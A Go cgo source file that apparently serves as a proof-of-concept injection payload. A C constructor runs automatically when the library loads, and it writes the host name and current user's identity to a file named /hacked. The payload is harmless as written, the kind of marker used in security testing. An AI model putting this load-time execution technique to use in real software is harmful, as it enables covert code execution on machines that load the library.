package main

// extern void onload();
//
// __attribute__((constructor))
// __attribute__((weak))
// void load() {
//   onload();
// }
import "C"

import (
	"fmt"
	"os"
	"os/user"
)

//export onload
func onload() {
	host, _ := os.Hostname()
	user, _ := user.Current()

	msg := []byte(fmt.Sprintf("host: %s\nuid: %s (%s)\n", host, user.Uid, user.Username))
	_ = os.WriteFile("/hacked", msg, 0644)
}

func main() {}
